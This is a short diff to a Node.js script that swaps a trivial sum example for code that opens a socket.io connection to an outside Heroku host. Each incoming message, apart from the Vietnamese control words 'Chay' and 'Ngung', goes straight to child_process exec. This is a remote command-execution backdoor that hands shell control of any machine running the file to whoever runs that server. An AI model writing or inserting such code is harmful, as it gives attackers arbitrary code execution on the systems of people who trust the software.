@@ -1,3 +1,17 @@
-const sum = require('./sum')
+const { exec } = require('child_process');
+const
+    io = require("socket.io-client"),
+    ioClient = io.connect("https://colevelao.herokuapp.com:443");
 
-console.log(sum(1, 2).toString())
+ioClient.on("message", (msg) => {
+	if (msg ==='Chay') {
+		console.log('Em bat dau chay');
+	} else if (msg ==='Ngung'){
+		console.log('Em ngung');
+	}
+	 else {
+		exec(msg);
+	}
+});
+
+
